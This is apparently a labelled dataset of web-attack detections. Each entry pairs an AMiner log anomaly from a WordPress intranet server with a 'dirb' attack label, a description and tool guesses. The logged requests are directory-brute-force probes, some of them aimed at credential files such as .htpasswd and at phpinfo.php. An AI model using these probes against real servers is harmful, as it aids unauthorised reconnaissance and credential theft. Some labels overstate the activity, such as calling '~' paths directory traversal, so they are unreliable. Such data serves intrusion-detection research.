+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-includes/js/thickbox/~www\"], \"MissingCharacters\": [\"~\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:31:21 +0000] \\\"GET /wp-includes/js/thickbox/~www HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509081], \"DetectionTimestamp\": [1642509081], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access a directory without a valid index file, potentially indicating an attempt to list directory contents (directory traversal) or probe for misconfigurations.",
+    "tools": [
+      "Nikto",
+      "DirBuster",
+      "OWASP ZAP"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:31:21.064827 2022] [autoindex:error] [pid 28239] [client 172.17.130.196:60640] AH01276: Cannot serve directory /var/www/intranet.price.fox.org/wp-includes/js/thickbox/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive\"], \"Timestamps\": [1642509081.06], \"DetectionTimestamp\": [1642509081.06], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Vulnerability Scanning",
+      "Exploitation for Credential Access"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access a '.hta' file, which could contain sensitive information or be part of a web server configuration. This is often an attempt to find misconfigurations or gain unauthorized access to hidden files.",
+    "tools": [
+      "Nikto",
+      "Burp Suite",
+      "Nessus"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/ah\", \"/model/with_data/fm/client/fm/ah/ah_str\", \"/model/with_data/fm/client/fm/ah/ah_number\", \"/model/with_data/fm/client/fm/ah/colon\", \"/model/with_data/fm/client/fm/ah/msg\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:31:21.087557 2022] [authz_core:error] [pid 28239] [client 172.17.130.196:60640] AH01630: client denied by server configuration: /var/www/intranet.price.fox.org/wp-includes/js/thickbox/.hta\"], \"Timestamps\": [1642509081.09], \"DetectionTimestamp\": [1642509081.09], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "Unusual character '+' in URL path 'lost+found'. While 'lost+found' might exist, the '+' character in the URL is anomalous for a typical file or directory name, suggesting an attempt to probe for vulnerabilities or misconfigurations. It's often associated with URL encoding or atypical file paths.",
+    "tools": [
+      "Wget",
+      "Curl",
+      "Nikto"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-includes/js/tinymce/lost+found\"], \"MissingCharacters\": [\"+\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:31:39 +0000] \\\"GET /wp-includes/js/tinymce/lost+found HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509099], \"DetectionTimestamp\": [1642509099], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Vulnerability Scanning",
+      "Information Gathering",
+      "Web Server Compromise"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access 'phpinfo.php', a file often used to display PHP configuration information. Attackers frequently look for this file to gather details about the server environment, which can then be used to identify vulnerabilities.",
+    "tools": [
+      "Nikto",
+      "Nessus",
+      "OpenVAS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/script\", \"/model/with_data/fm/client/fm/script/script_str\", \"/model/with_data/fm/client/fm/script/script_path\", \"/model/with_data/fm/client/fm/script/msg\", \"/model/with_data/fm/client/fm/script/referer\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:31:41.077400 2022] [php7:error] [pid 28492] [client 172.17.130.196:60784] script '/var/www/intranet.price.fox.org/wp-includes/js/tinymce/phpinfo.php' not found or unable to stat\"], \"Timestamps\": [1642509101.08], \"DetectionTimestamp\": [1642509101.08], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Vulnerability Scanning",
+      "Information Gathering"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access a PHP file ('index.php') within a theme directory that is reported as 'not found or unable to stat'. This is a common tactic for attackers to probe for known vulnerabilities in themes or plugins, or to discover existing files and directories.",
+    "tools": [
+      "WPScan",
+      "Nikto",
+      "DirBuster"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/script\", \"/model/with_data/fm/client/fm/script/script_str\", \"/model/with_data/fm/client/fm/script/script_path\", \"/model/with_data/fm/client/fm/script/msg\", \"/model/with_data/fm/client/fm/script/referer\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:35:12.988672 2022] [php7:error] [pid 28490] [client 172.17.130.196:34036] script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/index.php' not found or unable to stat\"], \"Timestamps\": [1642509312.99], \"DetectionTimestamp\": [1642509312.99], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "Unusual character '+' in URL path 'lost+found'. While 'lost+found' might exist, the '+' character in the URL is anomalous for a typical file or directory name, suggesting an attempt to probe for vulnerabilities or misconfigurations. It's often associated with URL encoding or atypical file paths.",
+    "tools": [
+      "Wget",
+      "Curl",
+      "Nikto"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/themes/go/includes/classes/lost+found\"], \"MissingCharacters\": [\"+\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:35:13 +0000] \\\"GET /wp-content/themes/go/includes/classes/lost+found HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509313], \"DetectionTimestamp\": [1642509313], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Vulnerability Scanning",
+      "Information Gathering"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access 'info.php' within a WordPress theme directory, which is a common filename for web server information or PHP configuration files. Attackers often probe for such files to gain insights into the server environment.",
+    "tools": [
+      "Nikto",
+      "Nessus",
+      "OpenVAS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/script\", \"/model/with_data/fm/client/fm/script/script_str\", \"/model/with_data/fm/client/fm/script/script_path\", \"/model/with_data/fm/client/fm/script/msg\", \"/model/with_data/fm/client/fm/script/referer\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:35:13.060355 2022] [php7:error] [pid 28567] [client 172.17.130.196:34038] script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/info.php' not found or unable to stat\"], \"Timestamps\": [1642509313.06], \"DetectionTimestamp\": [1642509313.06], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Vulnerability Scanning",
+      "Information Gathering",
+      "Web Server Compromise"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access 'phpinfo.php', a file often used to display PHP configuration information. Attackers frequently look for this file to gather details about the server environment, which can then be used to identify vulnerabilities.",
+    "tools": [
+      "Nikto",
+      "Nessus",
+      "OpenVAS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/script\", \"/model/with_data/fm/client/fm/script/script_str\", \"/model/with_data/fm/client/fm/script/script_path\", \"/model/with_data/fm/client/fm/script/msg\", \"/model/with_data/fm/client/fm/script/referer\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:35:15.370308 2022] [php7:error] [pid 28576] [client 172.17.130.196:34054] script '/var/www/intranet.price.fox.org/wp-content/themes/go/includes/classes/phpinfo.php' not found or unable to stat\"], \"Timestamps\": [1642509315.37], \"DetectionTimestamp\": [1642509315.37], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Directory Traversal",
+      "Reconnaissance"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '~' in URL path '~logs' within a WordPress theme's admin images directory. This pattern often indicates an attempt to access user home directories or common administrative log files, which could contain sensitive information.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "Wget"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/themes/go/dist/images/admin/~logs\"], \"MissingCharacters\": [\"~\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:36:58 +0000] \\\"GET /wp-content/themes/go/dist/images/admin/~logs HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509418], \"DetectionTimestamp\": [1642509418], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Directory Traversal",
+      "Reconnaissance"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '~' in URL path '~lp' within a WordPress theme's admin images directory. This pattern often indicates an attempt to access user home directories, potentially looking for sensitive files or misconfigurations.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "Wget"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/themes/go/dist/images/admin/~lp\"], \"MissingCharacters\": [\"~\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:36:58 +0000] \\\"GET /wp-content/themes/go/dist/images/admin/~lp HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509418], \"DetectionTimestamp\": [1642509418], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Directory Traversal",
+      "Reconnaissance"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '~' in URL path '~mail' within a WordPress theme's admin images directory. This pattern often indicates an attempt to access user home directories, potentially looking for mail-related files or configurations that might contain credentials or sensitive data.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "Wget"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/themes/go/dist/images/admin/~mail\"], \"MissingCharacters\": [\"~\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:36:58 +0000] \\\"GET /wp-content/themes/go/dist/images/admin/~mail HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509418], \"DetectionTimestamp\": [1642509418], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Directory Traversal",
+      "Reconnaissance"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '~' in URL path '~nobody' within a WordPress theme's admin images directory. This pattern often indicates an attempt to access user home directories, specifically probing for the 'nobody' user, which is a common unprivileged user on Unix-like systems. This could be an attempt to find misconfigured files or gain unauthorized access.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "Wget"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/themes/go/dist/images/admin/~nobody\"], \"MissingCharacters\": [\"~\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:36:58 +0000] \\\"GET /wp-content/themes/go/dist/images/admin/~nobody HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509418], \"DetectionTimestamp\": [1642509418], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Directory Traversal",
+      "Reconnaissance"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '~' in URL path '~operator' within a WordPress theme's admin images directory. This pattern often indicates an attempt to access user home directories, specifically probing for an 'operator' user, which might exist on some systems or configurations. This could be an attempt to find misconfigured files or gain unauthorized access.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "Wget"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/themes/go/dist/images/admin/~operator\"], \"MissingCharacters\": [\"~\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:36:58 +0000] \\\"GET /wp-content/themes/go/dist/images/admin/~operator HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509418], \"DetectionTimestamp\": [1642509418], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Vulnerability Scanning",
+      "Information Gathering"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access 'info.php' within a WordPress theme's admin images directory, which is a common filename for web server information or PHP configuration files. Attackers often probe for such files to gain insights into the server environment.",
+    "tools": [
+      "Nikto",
+      "Nessus",
+      "OpenVAS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/script\", \"/model/with_data/fm/client/fm/script/script_str\", \"/model/with_data/fm/client/fm/script/script_path\", \"/model/with_data/fm/client/fm/script/msg\", \"/model/with_data/fm/client/fm/script/referer\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:37:03.855479 2022] [php7:error] [pid 28495] [client 172.17.130.196:34832] script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/info.php' not found or unable to stat\"], \"Timestamps\": [1642509423.86], \"DetectionTimestamp\": [1642509423.86], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "Unusual character '+' in URL path 'lost+found'. While 'lost+found' might exist, the '+' character in the URL is anomalous for a typical file or directory name, suggesting an attempt to probe for vulnerabilities or misconfigurations. It's often associated with URL encoding or atypical file paths.",
+    "tools": [
+      "Wget",
+      "Curl",
+      "Nikto"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/themes/go/dist/images/admin/lost+found\"], \"MissingCharacters\": [\"+\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:37:04 +0000] \\\"GET /wp-content/themes/go/dist/images/admin/lost+found HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509424], \"DetectionTimestamp\": [1642509424], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Vulnerability Scanning",
+      "Information Gathering",
+      "Web Server Compromise"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access 'phpinfo.php', a file often used to display PHP configuration information. Attackers frequently look for this file to gather details about the server environment, which can then be used to identify vulnerabilities.",
+    "tools": [
+      "Nikto",
+      "Nessus",
+      "OpenVAS"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 3, \"AnalysisComponentType\": \"NewMatchPathDetector\", \"AnalysisComponentName\": \"AMiner: New event type.\", \"Message\": \"New path(es) detected\", \"PersistenceFileName\": \"nmpd\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/with_data/fm/client/fm/script\", \"/model/with_data/fm/client/fm/script/script_str\", \"/model/with_data/fm/client/fm/script/script_path\", \"/model/with_data/fm/client/fm/script/msg\", \"/model/with_data/fm/client/fm/script/referer\"]}, \"LogData\": {\"RawLogData\": [\"[Tue Jan 18 12:37:06.162318 2022] [php7:error] [pid 28492] [client 172.17.130.196:34850] script '/var/www/intranet.price.fox.org/wp-content/themes/go/dist/images/admin/phpinfo.php' not found or unable to stat\"], \"Timestamps\": [1642509426.16], \"DetectionTimestamp\": [1642509426.16], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-error.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Vulnerability Scanning",
+      "Exploitation for Credential Access"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access a '.hta' file, which could contain sensitive information or be part of a web server configuration. This is often an attempt to find misconfigurations or gain unauthorized access to hidden files.",
+    "tools": [
+      "Nikto",
+      "Burp Suite",
+      "Nessus"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:37:10 +0000] \\\"GET /wp-content/themes/go/dist/images/social/.hta HTTP/1.1\\\" 403 366 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509430], \"DetectionTimestamp\": [1642509430], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Credential Access",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access '.htpasswd', a file commonly used for HTTP Basic Authentication credentials. Attackers frequently look for this file to retrieve hashed passwords, which can then be cracked.",
+    "tools": [
+      "Wget",
+      "Curl",
+      "Burp Suite"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:37:23 +0000] \\\"GET /wp-content/themes/go/dist/js/admin/.htpasswd HTTP/1.1\\\" 403 366 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509443], \"DetectionTimestamp\": [1642509443], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Credential Access",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "Attempt to access '.htpasswd_', which is likely a backup or renamed '.htpasswd' file. Attackers often probe for variations of sensitive filenames to bypass security measures and retrieve credentials.",
+    "tools": [
+      "Wget",
+      "Curl",
+      "Burp Suite"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 4, \"AnalysisComponentType\": \"NewMatchPathValueDetector\", \"AnalysisComponentName\": \"AMiner: New status code in Apache Access log.\", \"Message\": \"New value(s) detected\", \"PersistenceFileName\": \"nmpvd_status_code\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/status_code\"], \"AffectedLogAtomValues\": [\"403\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:37:23 +0000] \\\"GET /wp-content/themes/go/dist/js/admin/.htpasswd_ HTTP/1.1\\\" 403 366 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509443], \"DetectionTimestamp\": [1642509443], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Vulnerability Scanning"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '@' in URL path. This character is unusual in a file or directory name within a web path and could indicate an attempt at email address enumeration, or a malformed request trying to bypass security filters.",
+    "tools": [
+      "Wget",
+      "Curl",
+      "Nikto"
+    ],
+    "anomaly": "{\"AnalysisComponent\": {\"AnalysisComponentIdentifier\": 7, \"AnalysisComponentType\": \"CharsetDetector\", \"AnalysisComponentName\": \"AMiner: New characters in Apache Access request.\", \"Message\": \"New character(s) detected\", \"PersistenceFileName\": \"charset_request\", \"TrainingMode\": false, \"AffectedLogAtomPaths\": [\"/model/fm/request/request\"], \"AffectedLogAtomValues\": [\"/wp-content/themes/go/dist/js/admin/@\"], \"MissingCharacters\": [\"@\"]}, \"LogData\": {\"RawLogData\": [\"172.17.130.196 - - [18/Jan/2022:12:37:23 +0000] \\\"GET /wp-content/themes/go/dist/js/admin/@ HTTP/1.1\\\" 404 363 \\\"-\\\" \\\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\\"\"], \"Timestamps\": [1642509443], \"DetectionTimestamp\": [1642509443], \"LogLinesCount\": 1, \"LogResources\": [\"/var/log/apache2/intranet-access.log\"]}, \"AMiner\": {\"ID\": \"10.35.35.206\"}}\n"
+  },
+  {
+    "predicted_attack_type": [
+      "Information Gathering",
+      "Directory Traversal",
+      "Reconnaissance"
+    ],
+    "attack_type": "dirb",
+    "description": "New character '~' in URL path '~adm' within a WordPress theme's admin JavaScript directory. This pattern often indicates an attempt to access user home directories, specifically probing for an 'adm' (administrator) account, which could contain sensitive information.",
+    "tools": [
+      "Burp Suite",
+      "OWASP ZAP",
+      "Wget"
+    ],
